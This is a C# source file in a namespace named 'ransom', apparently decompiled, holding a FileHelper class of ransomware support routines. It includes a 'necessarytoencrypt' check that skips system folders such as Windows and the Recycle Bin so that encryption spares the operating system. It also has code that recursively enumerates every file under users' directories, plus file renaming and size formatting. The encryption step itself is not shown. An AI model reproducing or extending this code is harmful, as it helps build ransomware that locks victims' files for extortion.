using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security;
using System.Security.Permissions;

namespace ransom;

internal class FileHelper
{
	public static string ParseByteInString(long byteCount)
	{
		string result = "0 Bytes";
		if ((double)byteCount >= 1073741824.0)
		{
			result = $"{(double)byteCount / 1073741824.0:##.##}" + " GB";
		}
		else if ((double)byteCount >= 1048576.0)
		{
			result = $"{(double)byteCount / 1048576.0:##.##}" + " MB";
		}
		else if ((double)byteCount >= 1024.0)
		{
			result = $"{(double)byteCount / 1024.0:##.##}" + " KB";
		}
		else if (byteCount > 0L && (double)byteCount < 1024.0)
		{
			result = byteCount + " Bytes";
		}
		return result;
	}

	public static void RenameFile(string a, string b)
	{
		File.Move(a, b);
	}

	public static bool necessarytoencrypt(string folder_path)
	{
		if (folder_path.Equals(folder_path.Split(new char[1] { ':' })[0] + ":\\$RECYCLE.BIN"))
		{
			return false;
		}
		if (folder_path.Equals(folder_path.Split(new char[1] { ':' })[0] + ":\\$Recycle.Bin"))
		{
			return false;
		}
		if (folder_path.Equals(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) + "Documents and Settings"))
		{
			return false;
		}
		if (folder_path.Equals(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) + "Windows"))
		{
			return false;
		}
		if (folder_path.Equals(folder_path.Split(new char[1] { ':' })[0] + ":\\System Volume Information"))
		{
			return false;
		}
		if (folder_path.Equals(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) + "Users"))
		{
			return false;
		}
		return true;
	}

	public static IEnumerable<string> GetUsersDirectory()
	{
		string[] directories = Directory.GetDirectories(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) + "Users");
		for (int i = 0; i < directories.Length; i++)
		{
			yield return directories[i];
		}
	}

	public static IEnumerable<string> GetFiles(string rootDirectory)
	{
		IEnumerable<string> files = Enumerable.Empty<string>();
		IEnumerable<string> directories = Enumerable.Empty<string>();
		try
		{
			((CodeAccessPermission)new FileIOPermission((FileIOPermissionAccess)8, rootDirectory)).Demand();
			files = Directory.GetFiles(rootDirectory);
			directories = Directory.GetDirectories(rootDirectory);
		}
		catch
		{
			rootDirectory = null;
		}
		if (rootDirectory != null)
		{
			yield return rootDirectory;
		}
		foreach (string item in files)
		{
			yield return item;
		}
		IEnumerable<string> enumerable = directories.SelectMany(GetFiles);
		foreach (string item2 in enumerable)
		{
			yield return item2;
		}
	}
}
